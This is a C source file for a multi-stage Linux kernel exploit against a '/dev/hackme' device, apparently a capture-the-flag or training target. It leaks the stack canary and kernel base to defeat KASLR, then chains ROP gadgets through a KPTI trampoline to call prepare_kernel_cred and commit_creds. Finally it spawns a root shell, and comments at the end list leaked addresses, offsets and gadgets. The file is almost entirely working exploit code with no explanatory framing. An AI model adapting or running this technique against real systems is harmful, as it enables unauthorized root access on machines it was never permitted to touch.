#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>

unsigned long cookie;
unsigned long uneffected_leaked_address;
unsigned long text_base;
unsigned long commit_cred_ksymtab;
unsigned long prepare_kernel_cred_ksymtab;
unsigned long swapgs_restore_regs_and_return_to_usermode;
unsigned long push_rax_ret;
unsigned long pop_rdi_ret;
unsigned long read_mem_into_rax;
unsigned long pop_rax_ret;

unsigned long value_offset; 
unsigned long prepare_kernel_cred;
unsigned long commit_creds;

unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long cred_struct; // ksymtab { int value_offset}


int dev_fd;

void device_open(){
    dev_fd = open("/dev/hackme",O_RDWR);
	if (dev_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} 
    else 
        puts("[*] Device opened");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
unsigned long user_rip = (unsigned long)get_shell;

void leak(){
    unsigned n = 50;
    unsigned long leak[n];
    ssize_t r = read(dev_fd, leak, sizeof(leak));
    cookie = leak[16];
    /*
    puts("---------------Stack Address Leak---------------");

    for(int i=0; i<100; i++)
        printf("[*] leak[%d]: %lx\n", i , leak[i]);

    puts("---------------Stack Address Leak---------------");
    */
    uneffected_leaked_address = leak[38]; // leak[38] = ffffffff9420a157
    printf("[*] Non randomized leaked address: %lx\n", uneffected_leaked_address );

    text_base = uneffected_leaked_address - 0xA157UL;
    printf("[*] Text base address: %lx\n", text_base );

    commit_cred_ksymtab = text_base + 0xF87D90UL ;
    printf("[*] commit_cred_ksymtab: %lx\n", commit_cred_ksymtab );

    prepare_kernel_cred_ksymtab = text_base + 0xF8D4FCUL;
    printf("[*] prepare_kernel_cred_ksymtab: %lx\n", prepare_kernel_cred_ksymtab );

    swapgs_restore_regs_and_return_to_usermode = text_base + 0x200F10UL + 22UL;
    printf("[*] kpti trampoline: %lx\n", swapgs_restore_regs_and_return_to_usermode );

    pop_rdi_ret = text_base + 0X6370UL; //pop rdi
    printf("[*] Pop rdi %lx\n", pop_rdi_ret );
    
    pop_rax_ret = text_base + 0x4D11UL; //0xffffffff81004d11 : pop rax ; ret
    printf("[*] Pop rax %lx\n", pop_rax_ret );

    push_rax_ret = text_base + 0x6070UL; //push rax;
    printf("[*] Push rax %lx\n", push_rax_ret );

    read_mem_into_rax = text_base + 0x15A7DUL; //0xffffffff81015a7d : mov ebp, esp ; mov rax, qword ptr [rax] ; pop rbp ; ret
    printf("[*] Read mem: %lx\n", read_mem_into_rax );
}


void stage4(){
    unsigned long payload[50];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0; //rbx
    payload[off++] = 0; //r12
    payload[off++] = 0; //rbp
    payload[off++] = pop_rdi_ret; //pop rax ; ret
    payload[off++] = cred_struct;
    payload[off++] = commit_creds;
    payload[off++] = swapgs_restore_regs_and_return_to_usermode ; 
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;
    puts("[*] Writing Stage-4 payload");
    write(dev_fd, payload, sizeof(payload));
    puts("[*] Payload written");
}

void get_cred_struct(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov cred_struct, rax;"
        ".att_syntax;"
    );
    printf("[*] Prepared cred_struct: %lx\n", cred_struct);
    stage4();
}


void stage3(){
    unsigned long payload[50];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0; //rbx
    payload[off++] = 0; //r12
    payload[off++] = 0; //rbp
    payload[off++] = pop_rdi_ret; //pop rax ; ret
    payload[off++] = 0;
    payload[off++] = prepare_kernel_cred;
    payload[off++] = swapgs_restore_regs_and_return_to_usermode ; 
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = (unsigned long)get_cred_struct;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;
    puts("[*] Writing Stage-3 payload");
    write(dev_fd, payload, sizeof(payload));
    puts("[*] Payload written");
}

void get_commit_cred_address(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov value_offset, rax;"
        ".att_syntax;"
    );
    commit_creds = commit_cred_ksymtab + (int)value_offset;
    printf("[*] Commit_cred : %lx\n", commit_creds);
    //printf("[*] Value offset: %lx\n", value_offset);
    stage3();
}

void stage2(){
    unsigned long payload[50];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0; //rbx
    payload[off++] = 0; //r12
    payload[off++] = 0; //rbp
    payload[off++] = pop_rax_ret; //pop rax ; ret
    payload[off++] = commit_cred_ksymtab;
    payload[off++] = read_mem_into_rax; // mov ebp, esp ; mov rax, qword ptr [rax] ; pop rbp ; ret
    payload[off++] = 0x0;
    payload[off++] = swapgs_restore_regs_and_return_to_usermode ; 
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = (unsigned long)get_commit_cred_address;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;
   puts("[*] Writing Stage-2 payload");
    write(dev_fd, payload, sizeof(payload));
    puts("[*] Payload written");
}

void get_prepare_kernel_cred_address(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov value_offset, rax;"
        ".att_syntax;"
    );
    prepare_kernel_cred = prepare_kernel_cred_ksymtab + (int)value_offset;
    printf(" Prepare_kernel_cred: %lx\n", prepare_kernel_cred);
    //printf("    --> commit_creds: %lx\n", value_offset);
    //printf("    --> commit_creds: %d\n", (int)value_offset);
    // puts("");
    //stage2();
}

void stage1(){
    unsigned long payload[50];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0; //rbx
    payload[off++] = 0; //r12
    payload[off++] = 0; //rbp
    payload[off++] = pop_rax_ret; //pop rax ; ret
    payload[off++] = prepare_kernel_cred_ksymtab;
    payload[off++] = read_mem_into_rax; // mov ebp, esp ; mov rax, qword ptr [rax] ; pop rbp ; ret
    payload[off++] = 0x0;
    payload[off++] = swapgs_restore_regs_and_return_to_usermode ; 
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = (unsigned long)get_prepare_kernel_cred_address;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;
    puts("[*] Writing Stage-1 payload");
    write(dev_fd, payload, sizeof(payload));
    puts("[*] Payload written");
}


void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;" //copy the flag register at the top of the stack.
        "pop user_rflags;"
        ".att_syntax;"
    );
}

int main(){
    puts("[*] Opening /dev/hackme");

    device_open();
    puts("[*] Stack addresses leaked");
    save_state();
    
    puts("[*] State saved");
    
    leak();

    if (getuid() == 0)
        printf("Already root!\n");
    else 
        printf("Regular user!\n");

    puts("[*] Canary leaked");

    stage1();
    
    puts("[!] RIP - Should never be reached");
    
    return 0;
}












/*                         
ffffffff94200000 _text
ffffffff94600dc6 __x86_retpoline_r15
0xffffffff9420a157 - 0xffffffff94200000 = 0xA157

[*] leak[0]: ffffffff94615790

[*] leak[10]: ffffffff94ab0ae7
[*] leak[11]: ffffffff94ab0ae7

[*] leak[20]: ffffffff9483549f



[*] leak[27]: ffffffff94a8f247
[*] leak[28]: ffffffff94ca9541

[*] leak[36]: ffffffff9490dd1a

[*] leak[38]: ffffffff9420a157
[*] leak[41]: ffffffff9440008c
*/


/*
 __ksymtab_commit_creds = ffffffff95187d90
 __ksymtab_prepare_kernel_cred =  ffffffff9518d4fc
swapgs_restore_regs_and_return_to_usermode = ffffffff9e400f10 , text = ffffffff9e200000

ksymtab_commit_cred_offset = __ksymtab_commit_creds - _text = F87D90
ksymtab_prepare_kernel_cred_offset = __ksymtab_prepare_kernel_cred - _text = F8D4FC
swapgs_restore_regs_and_return_to_usermode_offset = 200F10
*/


/*
0xffffffff81006370 : pop rdi ; ret ; offset = 0x6370
0xffffffff81006070 : push rax ; ret ; offset = 0x6070



0xffffffff814a7132 : mov rax, qword ptr [rsi] ; ret ; offset = 4A7132

0xffffffff8150b97e : pop rsi ; ret ; offset = 50B97E

0xffffffff81f584c6 : xor eax, eax ; pop rsi ; pop rbp ; ret

*/


